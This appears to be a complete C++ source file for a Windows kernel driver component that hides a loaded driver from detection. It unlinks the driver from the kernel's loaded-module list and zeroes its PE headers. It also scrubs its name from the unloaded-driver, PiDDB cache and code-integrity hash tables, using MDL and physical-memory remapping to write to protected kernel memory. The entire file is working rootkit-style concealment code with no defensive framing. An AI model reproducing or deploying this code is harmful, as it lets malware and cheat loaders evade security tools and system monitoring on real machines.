#include "conceal.hxx"

#include "shared/pe.hxx"
#include "shared/validation.hxx"

namespace {

using dump::protocol::u16;
using dump::protocol::u32;
using dump::protocol::u64;
using dump::protocol::wide_char;

constexpr u32 page_span = 0x1000;
constexpr u32 maximum_header_span = 0x10000;
constexpr u32 window_span = 0x200;
constexpr u32 tree_stack_limit = 64;
constexpr u32 ldr_links_offset = 0x0;
constexpr u32 ldr_dll_base_offset = 0x30;
constexpr u32 ldr_size_of_image_offset = 0x40;
constexpr u32 ldr_base_dll_name_offset = 0x50;
constexpr u32 ldr_entry_span = 0x60;
constexpr u32 name_span = 0x10;
constexpr u32 list_walk_limit = 4096;
constexpr u32 list_head_limit = 64;
constexpr u32 tree_walk_limit = 4096;
constexpr u32 avl_compare_offset = 0x38;
constexpr u32 avl_count_offset = 0x2c;
constexpr u32 avl_node_span = 0x18;
constexpr u32 tree_node_span = 0x18;
constexpr u32 wide = static_cast<u32>(sizeof(wide_char));
constexpr u32 maximum_text = 0x100;

alignas(16) unsigned char header_page[page_span];
alignas(16) unsigned char scan_page[page_span];
alignas(16) unsigned char zero_page[page_span];

struct image_view {
    u64 base{};
    u32 timestamp{};
    u32 image_size{};
    u32 headers_size{};
    u32 text_begin{};
    u32 text_end{};
    u32 section_count{};
    dump::pe::Section sections[dump::protocol::maximum_sections]{};
};

struct name_hit {
    u64 field{};
    u64 buffer{};
    u32 length{};
};

struct counter {
    u32 wiped{};
    u32 list{};
    u32 link{};
};

extern "C" PVOID NTAPI RtlPcToFileHeader(PVOID pc_value, PVOID* base_of_image);

bool pc_to_file_header(PVOID pc_value, PVOID* base_of_image) noexcept {
    __try {
        RtlPcToFileHeader(pc_value, base_of_image);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
    return *base_of_image != nullptr;
}

u16 load16(const unsigned char* data) noexcept {
    return static_cast<u16>(data[0] | (static_cast<u16>(data[1]) << 8));
}

u32 load32(const unsigned char* data) noexcept {
    return static_cast<u32>(data[0]) | (static_cast<u32>(data[1]) << 8) | (static_cast<u32>(data[2]) << 16) | (static_cast<u32>(data[3]) << 24);
}

u64 load64(const unsigned char* data) noexcept {
    u64 value{};
    for (u32 index = 0; index < 8; ++index) {
        value |= static_cast<u64>(data[index]) << (index * 8);
    }
    return value;
}

bool present(const u64 address, const u32 size) noexcept {
    if (dump::validation::validate_kernel_range(address, size) != dump::Status::success) {
        return false;
    }
    return MmIsAddressValid(reinterpret_cast<void*>(address)) && MmIsAddressValid(reinterpret_cast<void*>(address + size - 1));
}

bool read(const u64 address, void* destination, const u32 size) noexcept {
    if (dump::validation::validate_kernel_range(address, size) != dump::Status::success) {
        return false;
    }
    __try {
        RtlCopyMemory(destination, reinterpret_cast<const void*>(address), size);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
    return true;
}

bool write_locked(const u64 address, const void* source, const u32 size) noexcept {
    const u64 start = address & ~static_cast<u64>(page_span - 1);
    const u32 offset = static_cast<u32>(address - start);
    const u32 span = (offset + size + page_span - 1) & ~(page_span - 1);
    auto* mdl = IoAllocateMdl(reinterpret_cast<void*>(start), span, FALSE, FALSE, nullptr);
    if (mdl == nullptr) {
        return false;
    }
    __try {
        MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        IoFreeMdl(mdl);
        return false;
    }
    bool written{};
    __try {
        auto* mapped = static_cast<unsigned char*>(MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmCached, nullptr, FALSE, NormalPagePriority));
        if (mapped != nullptr) {
            if (NT_SUCCESS(MmProtectMdlSystemAddress(mdl, PAGE_READWRITE))) {
                RtlCopyMemory(mapped + offset, source, size);
                written = true;
            }
            MmUnmapLockedPages(mapped, mdl);
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        written = false;
    }
    MmUnlockPages(mdl);
    IoFreeMdl(mdl);
    return written;
}

bool write_physical(const u64 address, const void* source, const u32 size) noexcept {
    PHYSICAL_ADDRESS physical{};
    __try {
        physical = MmGetPhysicalAddress(reinterpret_cast<void*>(address));
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return false;
    }
    if (physical.QuadPart == 0) {
        return false;
    }
    auto* mapped = static_cast<unsigned char*>(MmMapIoSpace(physical, size, MmCached));
    if (mapped == nullptr) {
        return false;
    }
    bool written{};
    __try {
        RtlCopyMemory(mapped, source, size);
        written = true;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        written = false;
    }
    MmUnmapIoSpace(mapped, size);
    return written;
}

bool write(const u64 address, const void* source, const u32 size) noexcept {
    if (dump::validation::validate_kernel_range(address, size) != dump::Status::success || !present(address, size)) {
        return false;
    }
    const auto* bytes = static_cast<const unsigned char*>(source);
    const auto check = size < 8 ? size : static_cast<u32>(8);
    unsigned char verify[8]{};
    bool done{};
    __try {
        RtlCopyMemory(reinterpret_cast<void*>(address), source, size);
        done = true;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        done = false;
    }
    if (!done) {
        done = write_locked(address, source, size);
    }
    if (!done) {
        done = write_physical(address, source, size);
    }
    if (!done || !read(address, verify, check)) {
        return false;
    }
    for (u32 index = 0; index < check; ++index) {
        if (verify[index] != bytes[index]) {
            return false;
        }
    }
    return true;
}

u64 system_base() noexcept {
    const wchar_t* names[] = {L"PsGetCurrentProcess", L"IoCreateDevice", L"KeBugCheckEx"};
    for (const auto* name : names) {
        UNICODE_STRING routine_name{};
        RtlInitUnicodeString(&routine_name, name);
        const auto routine = MmGetSystemRoutineAddress(&routine_name);
        if (routine == nullptr) {
            continue;
        }
        PVOID module_base{};
        if (pc_to_file_header(routine, &module_base) && module_base != nullptr) {
            return reinterpret_cast<u64>(module_base);
        }
    }
    return 0;
}

bool load_image(const u64 base, image_view& view) noexcept {
    if (dump::validation::validate_kernel_pointer(base) != dump::Status::success || !present(base, page_span)) {
        return false;
    }
    if (!read(base, header_page, page_span)) {
        return false;
    }
    dump::pe::Image parsed{};
    if (dump::pe::parse(header_page, page_span, parsed) != dump::Status::success) {
        return false;
    }
    view = image_view{};
    view.base = base;
    view.timestamp = parsed.timestamp;
    view.image_size = parsed.image_size;
    view.headers_size = dump::pe::header_extent(parsed);
    view.section_count = parsed.section_count;
    for (u32 index = 0; index < parsed.section_count; ++index) {
        view.sections[index] = parsed.sections[index];
        if (dump::pe::executable(parsed.sections[index])) {
            const auto begin = parsed.sections[index].virtual_address;
            const auto end = begin + dump::pe::extent(parsed.sections[index], parsed.image_size);
            if (view.text_begin == 0 || begin < view.text_begin) {
                view.text_begin = begin;
            }
            if (end > view.text_end) {
                view.text_end = end;
            }
        }
    }
    return view.text_begin != 0 && view.text_end > view.text_begin;
}

wide_char lowered(const wide_char value) noexcept {
    if (value >= L'A' && value <= L'Z') {
        return static_cast<wide_char>(value + (L'a' - L'A'));
    }
    return value;
}

u32 target_length(const wchar_t* target) noexcept {
    u32 length{};
    while (target[length] != 0 && length < dump::protocol::maximum_module_name) {
        ++length;
    }
    return length;
}

bool name_matches(const u64 buffer, const u32 length, const wchar_t* target) noexcept {
    const auto count = length / wide;
    if (count < 5 || count > maximum_text || buffer == 0) {
        return false;
    }
    const auto required = count * wide;
    if (required > wide * maximum_text) {
        return false;
    }
    wide_char text[maximum_text + 1]{};
    if (!read(buffer, text, required)) {
        return false;
    }
    const auto expected = target_length(target);
    if (expected == 0 || expected > count) {
        return false;
    }
    const auto skip = count - expected;
    if (skip != 0 && text[skip - 1] != L'\\' && text[skip - 1] != L'/') {
        return false;
    }
    for (u32 index = 0; index < expected; ++index) {
        if (lowered(text[skip + index]) != lowered(target[index])) {
            return false;
        }
    }
    return true;
}

bool match_window(const u64 base, const u32 span, const wchar_t* target, name_hit& hit) noexcept {
    if (span < name_span || !present(base, span)) {
        return false;
    }
    if (!read(base, scan_page, span)) {
        return false;
    }
    for (u32 position = 0; position + name_span <= span; position += 8) {
        const auto length = load16(scan_page + position);
        const auto maximum = load16(scan_page + position + 2);
        if (dump::validation::validate_unicode_name(length, maximum) != dump::Status::success) {
            continue;
        }
        const auto buffer = load64(scan_page + position + 8);
        if (!name_matches(buffer, length, target)) {
            continue;
        }
        hit.field = base + position;
        hit.buffer = buffer;
        hit.length = length;
        return true;
    }
    return false;
}

void record(name_hit* hits, u32& count, const u32 capacity, const u64 field, const u64 buffer, const u32 length) noexcept {
    if (count >= capacity) {
        return;
    }
    for (u32 index = 0; index < count; ++index) {
        if (hits[index].field == field) {
            return;
        }
    }
    hits[count].field = field;
    hits[count].buffer = buffer;
    hits[count].length = length;
    ++count;
}

u32 scan_inline(const image_view& view, const wchar_t* target, name_hit* hits, const u32 capacity, u32 count) noexcept {
    for (u32 index = 0; index < view.section_count && count < capacity; ++index) {
        const auto& section = view.sections[index];
        if (!dump::pe::writable(section) || dump::pe::executable(section)) {
            continue;
        }
        const auto extent = dump::pe::extent(section, view.image_size);
        const auto begin = view.base + section.virtual_address;
        for (u32 offset = 0; offset < extent && count < capacity; offset += page_span) {
            const auto remaining = extent - offset;
            const auto span = remaining < page_span ? remaining : page_span;
            name_hit hit{};
            if (match_window(begin + offset, span, target, hit)) {
                record(hits, count, capacity, hit.field, hit.buffer, hit.length);
            }
        }
    }
    return count;
}

u32 scan_pointers(const image_view& view, const wchar_t* target, name_hit* hits, const u32 capacity, u32 count) noexcept {
    for (u32 index = 0; index < view.section_count && count < capacity; ++index) {
        const auto& section = view.sections[index];
        if (!dump::pe::writable(section) || dump::pe::executable(section)) {
            continue;
        }
        const auto extent = dump::pe::extent(section, view.image_size);
        const auto begin = view.base + section.virtual_address;
        for (u32 offset = 0; offset + 8 <= extent && count < capacity; offset += 8) {
            u64 candidate{};
            if (!read(begin + offset, &candidate, 8)) {
                continue;
            }
            if (dump::validation::validate_kernel_pointer(candidate) != dump::Status::success || (candidate & 7) != 0) {
                continue;
            }
            name_hit hit{};
            if (match_window(candidate, window_span, target, hit)) {
                record(hits, count, capacity, hit.field, hit.buffer, hit.length);
            }
        }
    }
    return count;
}

u32 scan_lists(const image_view& view, const wchar_t* target, name_hit* hits, const u32 capacity, u32 count) noexcept {
    for (u32 index = 0; index < view.section_count && count < capacity; ++index) {
        const auto& section = view.sections[index];
        if (!dump::pe::writable(section) || dump::pe::executable(section)) {
            continue;
        }
        const auto extent = dump::pe::extent(section, view.image_size);
        const auto begin = view.base + section.virtual_address;
        for (u32 offset = 0; offset + 16 <= extent && count < capacity; offset += 8) {
            const auto head = begin + offset;
            u64 forward{};
            u64 backward{};
            if (!read(head, &forward, 8) || !read(head + 8, &backward, 8)) {
                continue;
            }
            if (dump::validation::validate_list_links(head, forward, backward) != dump::Status::success) {
                continue;
            }
            u64 check{};
            if (!read(forward + 8, &check, 8) || check != head) {
                continue;
            }
            auto node = forward;
            for (u32 step = 0; step < list_head_limit && node != head && count < capacity; ++step) {
                name_hit hit{};
                const auto window = node >= name_span ? node - name_span : node;
                if (match_window(window, 0x40, target, hit)) {
                    record(hits, count, capacity, hit.field, hit.buffer, hit.length);
                }
                if (!read(node, &node, 8)) {
                    break;
                }
            }
        }
    }
    return count;
}

u32 scan_tables(const image_view& view, const wchar_t* target, name_hit* hits, const u32 capacity, u32 count) noexcept {
    for (u32 index = 0; index < view.section_count && count < capacity; ++index) {
        const auto& section = view.sections[index];
        if (!dump::pe::writable(section) || dump::pe::executable(section)) {
            continue;
        }
        const auto extent = dump::pe::extent(section, view.image_size);
        const auto begin = view.base + section.virtual_address;
        for (u32 offset = 0; offset + avl_compare_offset + 8 <= extent && count < capacity; offset += 8) {
            const auto table = begin + offset;
            unsigned char field[8]{};
            if (!read(table + avl_compare_offset, field, 8)) {
                continue;
            }
            const auto compare = load64(field);
            if (compare < view.base + view.text_begin || compare >= view.base + view.text_end) {
                continue;
            }
            if (!read(table + avl_count_offset, field, 8)) {
                continue;
            }
            const auto elements = load32(field);
            if (elements == 0 || elements > tree_walk_limit) {
                continue;
            }
            u64 root{};
            if (!read(table + 0x10, &root, 8) || root == 0) {
                continue;
            }
            u64 stack[tree_stack_limit]{};
            u32 pending{};
            u32 visited{};
            stack[pending++] = root;
            while (pending > 0 && count < capacity && visited < tree_walk_limit) {
                const auto node = stack[--pending];
                if (dump::validation::validate_kernel_pointer(node) != dump::Status::success || (node & 7) != 0) {
                    continue;
                }
                ++visited;
                unsigned char links[tree_node_span]{};
                if (!read(node, links, tree_node_span)) {
                    continue;
                }
                name_hit hit{};
                if (match_window(node + avl_node_span, 0x40, target, hit)) {
                    record(hits, count, capacity, hit.field, hit.buffer, hit.length);
                }
                const auto left = load64(links + 8);
                const auto right = load64(links + 16);
                if (left != 0 && pending < tree_stack_limit) {
                    stack[pending++] = left;
                }
                if (right != 0 && pending < tree_stack_limit) {
                    stack[pending++] = right;
                }
            }
        }
    }
    return count;
}

bool detach_node(const u64 entry, const u64 forward, const u64 backward) noexcept {
    if (dump::validation::validate_list_links(entry, forward, backward) != dump::Status::success) {
        return false;
    }
    u64 check{};
    if (forward + 8 < forward || !read(forward + 8, &check, 8) || check != entry) {
        return false;
    }
    if (!read(backward, &check, 8) || check != entry) {
        return false;
    }
    const u64 self = entry;
    if (!write(forward + 8, &backward, 8)) {
        return false;
    }
    if (!write(backward, &forward, 8)) {
        return false;
    }
    if (!write(entry, &self, 8)) {
        return false;
    }
    return write(entry + 8, &self, 8);
}

bool detach_shifted(const u64 field, const u64 shift, const bool forward_direction) noexcept {
    const auto entry = forward_direction ? field + shift : field - shift;
    if (dump::validation::validate_kernel_pointer(entry) != dump::Status::success) {
        return false;
    }
    u64 forward{};
    u64 backward{};
    if (!read(entry, &forward, 8) || !read(entry + 8, &backward, 8)) {
        return false;
    }
    return detach_node(entry, forward, backward);
}

counter neutralize(const name_hit& hit) noexcept {
    counter result{};
    if (write(hit.buffer, zero_page, hit.length)) {
        result.wiped = 1;
    }
    if (hit.field >= name_span && detach_shifted(hit.field, name_span, false)) {
        result.list = 1;
        return result;
    }
    if (detach_shifted(hit.field, name_span, true)) {
        result.link = 1;
    }
    return result;
}

NTSTATUS locate(const u64 system, const u32 list_rva, const wchar_t* target, const bool hide, u64& module_base, u32& hidden) noexcept {
    module_base = 0;
    hidden = 0;
    if (dump::validation::validate_kernel_pointer(system) != dump::Status::success || list_rva == dump::protocol::unavailable_offset) {
        return STATUS_INVALID_PARAMETER;
    }
    const auto head = system + list_rva;
    unsigned char node[ldr_entry_span]{};
    if (!read(head, node, 16)) {
        return STATUS_INVALID_PARAMETER;
    }
    u64 entry = load64(node);
    for (u32 index = 0; index < list_walk_limit && entry != head; ++index) {
        if (!read(entry, node, ldr_entry_span)) {
            return STATUS_DATA_ERROR;
        }
        const auto name_length = load16(node + ldr_base_dll_name_offset);
        const auto name_maximum = load16(node + ldr_base_dll_name_offset + 2);
        const auto name_buffer = load64(node + ldr_base_dll_name_offset + 8);
        if (dump::validation::validate_unicode_name(name_length, name_maximum) == dump::Status::success && name_matches(name_buffer, name_length, target)) {
            const auto dll_base = load64(node + ldr_dll_base_offset);
            const auto image_size = load32(node + ldr_size_of_image_offset);
            if (dll_base == 0 || image_size == 0) {
                return STATUS_DATA_ERROR;
            }
            module_base = dll_base;
            if (!hide) {
                return STATUS_SUCCESS;
            }
            const auto forward = load64(node + ldr_links_offset);
            const auto backward = load64(node + ldr_links_offset + 8);
            if (!detach_node(entry, forward, backward)) {
                return STATUS_DATA_ERROR;
            }
            hidden = 1;
            return STATUS_SUCCESS;
        }
        entry = load64(node + ldr_links_offset);
    }
    return STATUS_NOT_FOUND;
}

u32 erase_headers(const u64 base, const image_view& view) noexcept {
    if (view.headers_size == 0 || view.headers_size > maximum_header_span) {
        return 0;
    }
    for (u32 offset = 0; offset < view.headers_size; offset += page_span) {
        const auto remaining = view.headers_size - offset;
        const auto span = remaining < page_span ? remaining : page_span;
        if (!write(base + offset, zero_page, span)) {
            return 0;
        }
    }
    unsigned char verify[2]{};
    if (!read(base, verify, sizeof(verify)) || verify[0] != 0 || verify[1] != 0) {
        return 0;
    }
    return 1;
}

struct scan_result {
    u32 unloaded{};
    u32 piddb{};
    u32 hash{};
    u32 hits{};
};

void apply_hits(const image_view& view, const wchar_t* target, scan_result& result, const bool primary) noexcept {
    name_hit hits[dump::protocol::maximum_scan_hits]{};
    u32 count{};
    if (primary) {
        count = scan_inline(view, target, hits, dump::protocol::maximum_scan_hits, count);
        count = scan_pointers(view, target, hits, dump::protocol::maximum_scan_hits, count);
        count = scan_lists(view, target, hits, dump::protocol::maximum_scan_hits, count);
        count = scan_tables(view, target, hits, dump::protocol::maximum_scan_hits, count);
    } else {
        count = scan_pointers(view, target, hits, dump::protocol::maximum_scan_hits, count);
        count = scan_lists(view, target, hits, dump::protocol::maximum_scan_hits, count);
    }
    result.hits += count;
    for (u32 index = 0; index < count; ++index) {
        const auto outcome = neutralize(hits[index]);
        if (primary) {
            result.piddb += outcome.list;
            result.unloaded += outcome.wiped;
            result.piddb += outcome.link;
        } else {
            result.hash += outcome.wiped;
            result.hash += outcome.list;
            result.hash += outcome.link;
        }
    }
}

}

namespace dump::driver {

NTSTATUS Conceal::apply(const protocol::ConcealTargets& targets, protocol::ConcealResponse& response) noexcept {
    response = protocol::ConcealResponse{};
    const auto system = system_base();
    if (system == 0) {
        response.native_status = STATUS_NOT_FOUND;
        return STATUS_NOT_FOUND;
    }
    image_view system_image{};
    if (!load_image(system, system_image)) {
        response.native_status = STATUS_INVALID_IMAGE_FORMAT;
        return STATUS_INVALID_IMAGE_FORMAT;
    }
    if (system_image.timestamp != targets.nt_timestamp || system_image.image_size != targets.nt_image_size) {
        response.native_status = STATUS_REVISION_MISMATCH;
        return STATUS_REVISION_MISMATCH;
    }
    wchar_t module_name[protocol::maximum_module_name]{};
    for (protocol::u32 index = 0; index < protocol::maximum_module_name; ++index) {
        module_name[index] = static_cast<wchar_t>(targets.module_name[index]);
    }
    u64 carrier{};
    if ((targets.flags & protocol::conceal_module_list) != 0) {
        u32 hidden{};
        const auto status = locate(system, targets.ps_loaded_module_list_rva, module_name, true, carrier, hidden);
        response.module_list_hidden = hidden;
        if (NT_SUCCESS(status) || status == STATUS_NOT_FOUND) {
            response.applied |= protocol::conceal_module_list;
        }
    }
    if (carrier == 0) {
        u32 hidden{};
        u64 located{};
        if (NT_SUCCESS(locate(system, targets.ps_loaded_module_list_rva, module_name, false, located, hidden))) {
            carrier = located;
        }
    }
    if ((targets.flags & protocol::conceal_headers) != 0 && carrier != 0) {
        image_view carrier_image{};
        if (load_image(carrier, carrier_image)) {
            response.headers_erased = erase_headers(carrier, carrier_image);
            if (response.headers_erased != 0) {
                response.applied |= protocol::conceal_headers;
            }
        }
    }
    scan_result result{};
    if ((targets.flags & (protocol::conceal_unloaded | protocol::conceal_piddb)) != 0) {
        apply_hits(system_image, module_name, result, true);
        response.applied |= targets.flags & (protocol::conceal_unloaded | protocol::conceal_piddb);
    }
    if ((targets.flags & protocol::conceal_hash_bucket) != 0) {
        u64 module_base{};
        u32 hidden{};
        if (NT_SUCCESS(locate(system, targets.ps_loaded_module_list_rva, L"ci.dll", false, module_base, hidden)) && module_base != 0) {
            image_view ci_image{};
            if (load_image(module_base, ci_image) && ci_image.timestamp == targets.ci_timestamp && ci_image.image_size == targets.ci_image_size) {
                apply_hits(ci_image, module_name, result, false);
                response.applied |= protocol::conceal_hash_bucket;
            }
        }
    }
    response.unloaded_hidden = result.unloaded;
    response.piddb_hidden = result.piddb;
    response.hash_bucket_hidden = result.hash;
    response.name_hits = result.hits;
    response.native_status = STATUS_SUCCESS;
    return STATUS_SUCCESS;
}

}
